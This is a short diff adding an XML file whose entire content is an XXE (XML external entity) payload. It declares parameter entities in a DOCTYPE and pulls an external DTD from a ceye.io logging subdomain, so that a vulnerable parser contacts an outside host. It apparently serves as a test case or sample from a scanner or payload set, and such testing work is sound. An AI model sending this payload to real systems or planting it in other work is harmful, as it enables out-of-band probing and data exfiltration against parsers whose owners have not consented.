@@ -1,0 +1,4 @@
+<?xml version="1.0"?>
+<!DOCTYPE ANY[ <!ENTITY % file "glassy">
+        <!ENTITY % remote PUBLIC "-//Sun Microsystems, Inc.//DTD JSP Tag Library 1.2//EN" "http://xxe.0cq48u.ceye.io/test.dtd"> %remote; %all; ]>
+<root>a</root>
